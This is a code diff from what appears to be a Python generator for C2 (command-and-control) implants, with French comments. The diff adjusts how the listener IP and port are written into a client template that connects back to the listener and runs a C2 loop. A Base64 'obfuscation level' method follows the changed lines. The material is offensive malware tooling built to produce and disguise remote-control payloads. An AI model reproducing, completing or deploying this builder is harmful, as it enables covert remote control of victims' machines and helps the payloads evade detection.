@@ -315,8 +315,8 @@ if __name__ == '__main__':
 
     try:
         with open(startup_log, 'a') as f:
-            f.write("[MAIN] Creating C2Client({0}, {1})\\n".format('__LISTENER_IP__', '__LISTENER_PORT__'))
-        client = C2Client('__LISTENER_IP__', '__LISTENER_PORT__')
+            f.write("[MAIN] Creating C2Client({0}, {1})\\n".format(__LISTENER_IP_STR__, __LISTENER_PORT_STR__))
+        client = C2Client(__LISTENER_IP__, __LISTENER_PORT__)
         with open(startup_log, 'a') as f:
             f.write("[MAIN] Calling client.run()\\n")
         client.run()
@@ -330,9 +330,11 @@ if __name__ == '__main__':
             f.write("[MAIN] Traceback: {0}\\n".format(traceback.format_exc()))
 '''
         # Remplacer les placeholders par les vraies valeurs
-        return code_template.replace("__LISTENER_IP__", repr(self.listener_ip)).replace(
-            "__LISTENER_PORT__", str(self.listener_port)
-        )
+        result = code_template.replace("__LISTENER_IP__", repr(self.listener_ip))
+        result = result.replace("__LISTENER_PORT__", str(self.listener_port))
+        result = result.replace("__LISTENER_IP_STR__", repr(self.listener_ip))
+        result = result.replace("__LISTENER_PORT_STR__", repr(self.listener_port))
+        return result
 
     def obfuscate_level_1(self, code: str) -> str:
         """Niveau 1: Base64"""
